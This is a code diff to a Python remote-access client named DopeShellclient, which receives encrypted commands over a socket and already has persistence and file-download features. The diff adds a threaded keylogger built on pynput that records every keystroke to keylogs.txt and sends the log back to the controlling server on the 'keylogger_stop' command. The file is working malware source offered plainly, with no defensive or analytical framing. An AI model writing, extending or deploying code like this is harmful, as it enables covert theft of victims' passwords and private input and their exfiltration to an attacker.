@@ -6,6 +6,8 @@ import getpass
 import platform
 import sys
 import io
+import pynput.keyboard 
+import threading
 from PIL import ImageGrab
 import shutil
 import base64
@@ -92,6 +94,41 @@ class DopeShellclient:
         except Exception as e:
             output = (f"[-] Failed to establish persistence: {e}")
         return output
+    
+    def start_keylogger(self):
+        self.is_keylogger_running = True
+        self.keylogger_thread = threading.Thread(target=self.keylogger)
+        self.keylogger_thread.start()
+        return "[+] Keylogger started."
+
+    # Method to stop keylogger and return logs
+    def stop_keylogger(self):
+        self.is_keylogger_running = False
+        if self.keylogger_thread:
+            self.keylogger_thread.join()
+
+        log_file_path = "keylogs.txt"
+        with open(log_file_path, "w") as f:
+            f.write("".join(self.keylog))
+
+        # Send keylogs back to server
+        self.send_data(log_file_path)
+
+        # Clear keylogs
+        self.keylog = []
+        return "[+] Keylogger stopped and keylogs sent."
+
+    # Keylogger function
+    def keylogger(self):
+        def on_press(key):
+            if self.is_keylogger_running:
+                try:
+                    self.keylog.append(key.char)
+                except AttributeError:
+                    self.keylog.append(f"[{key}]")
+
+        with pynput.keyboard.Listener(on_press=on_press) as listener:
+            listener.join()
 
     def execute_command(self, command):
         invalid = False
@@ -130,6 +167,8 @@ class DopeShellclient:
         
         while True:
             command = self.decrypt(self.sock.recv(4096)).decode('utf-8')
+            print(command)
+            print(type(command))
             if command.lower() == 'exit':
                 self.send_data('exiting')
                 break
@@ -174,6 +213,13 @@ class DopeShellclient:
                 except FileNotFoundError:
                     message = f"[-] Directory '{directory}' not found"
                 self.send_data(message)
+
+            elif command == "keylogger_start":
+                print("calling keylogger_start function")
+                response = self.start_keylogger()
+
+            elif command == "keylogger_stop":
+                response = self.stop_keylogger()
 
             elif command.lower().startswith('download'):
                 _, file_path = command.split()
